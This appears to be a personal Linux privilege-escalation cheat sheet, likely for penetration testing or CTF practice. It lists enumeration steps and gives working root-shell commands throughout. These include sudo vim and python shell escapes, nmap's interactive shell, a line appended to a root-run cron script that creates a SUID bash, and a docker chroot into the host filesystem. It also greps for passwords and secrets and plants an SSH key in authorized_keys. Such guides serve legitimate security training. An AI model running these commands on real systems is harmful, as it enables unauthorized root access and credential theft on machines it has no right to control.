
# Primiarly focus....
Sudo entries that show NOPASSWD or specific commands you can run as root.

SUID entries pointing to non-standard binaries (e.g., custom scripts, uncommon tools).

Writable /etc or scripts executed by cron as root.

Any cleartext credentials or keys.
________________________________________________________________________________________________________________________________________________________________

# Look for

1. Sudo rights (sudo -l) — immediate and often easiest.

2. SUID binaries — a few binaries with SUID root can be exploited via GTFOBins or simple misuse.

3. Writable files owned by root — config, scripts, cron jobs you can modify.

4. Cron jobs that run as root and call writable scripts or binaries.

5. Credentials lying around (.ssh/authorized_keys, config files, backups).

6. Services running as root you can interact with (listening sockets, daemons).

7. Docker / containers / LXC / snap misconfigs (docker group membership often => root).

8. Capabilities / setcap — binaries with elevated capabilities that let you escalate.

9. Kernel exploits only after everything else — but check kernel version & known local exploits.

10. Polkit, systemd timers, NFS exports, world-writable root-owned dirs — medium difficulty but common.
________________________________________________________________________________________________________________________________________________________________

- sudo check : sudo -l 

-- shows a binary you can run as root:

-- If it’s a shellable program (/bin/bash, /usr/bin/vim, less, find, awk, perl, python), spawn a root shell:

                            $cmd: sudo <binary>  # e.g., sudo /usr/bin/vim -c ':!bash'
                             sudo /usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
________________________________________________________________________________________________________________________________________________________________

- Find SUID files : find / -perm -4000 -type f 2>/dev/null | less

-- First identify obvious ones: nmap, less, vim, perl, python with SUID often lead to root shells via known tricks.

                                    $cmd (file path..>) /usr/bin/nmap --interactive
                                    !sh
                                    /usr/local/bin/.suidshell
________________________________________________________________________________________________________________________________________________________________
- Find writable files/dirs owned by root : find / -writable -user root -type f 2>/dev/null | less        
                                                                           OR
                                          : find / -xdev -type d -perm -2 -ls 2>/dev/null  ( # world-writable dirs )

  -- If a cron job runs /usr/local/bin/backup.sh as root and that file is writable by you:

                                    $cmd:  ls -la /etc/cron* /etc/cron.d /var/spool/cron

                                                or

                    if script is writable: echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/writable/script
________________________________________________________________________________________________________________________________________________________________

- Check cron and systemd timers : ls -la /etc/cron* /var/spool/cron /etc/systemd/system/*.timer /etc/cron.d 2>/dev/null

                                   crontab -l 2>/dev/null || true

                                 systemctl list-timers --all 2>/dev/null
________________________________________________________________________________________________________________________________________________________________
 Check for credentials and ssh keys : grep -R "PASSWORD\|passwd\|credential\|secret" /home /etc 2>/dev/null || true

                                      ls -la /home/*/.ssh /root/.ssh 2>/dev/null
________________________________________________________________________________________________________________________________________________________________
- Services / sockets : ss -tunlp  # or netstat -tulpn

                              ps aux --sort=-%mem | head -n 30
________________________________________________________________________________________________________________________________________________________________
- Docker / containers : groups   # are you in docker?

                       docker ps -a 2>/dev/null || true

-- If you are in the docker group or /var/run/docker.sock is accessible:

                              $cmd: docker ps -a
        
                docker run -v /:/mnt --rm -it alpine chroot /mnt sh ## or use runc to spawn a root shell from container host (search exact payloads)
________________________________________________________________________________________________________________________________________________________________

- Capabilities : getcap -r / 2>/dev/null

- Kernel version & distro : uname -a

                            cat /etc/os-release

-- If kernel version is old and known exploits exist, note the specific version (uname -a) and search searchsploit for local privilege escalation exploits.
 Use kernel exploits only if other vectors fail and you understand the exploit. Example to search locally (on your machine): //

                  $cmd: searchsploit linux kernel 4.4.0
________________________________________________________________________________________________________________________________________________________________
- Files modified recently (helps find creds/backups) : find / -type f -mtime -7 -ls 2>/dev/null

-- If linpeas shows a config file with credentials (DB password, admin password), try them:

                  $cmd: su - username   # or ssh username@localhost -p <port> using the found credential
________________________________________________________________________________________________________________________________________________________________

- For SSH keys:

      mkdir -p ~/.ssh; echo "<key>" >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys

      ssh -i id_rsa root@localhost

* when output is too large (lilnpeas,winpeas and many many more...)  *
________________________________________________________________________________________________________________________________________________________________

# quick filter for high-value keywords
grep -Ei "suid|sudo|crontab|cron|passwd|shadow|ssh|sshpass|authorized_keys|key|password|secret|token|docker|capabilities|setcap|systemctl|timer|service|nmap|exploit" output.txt | less
    
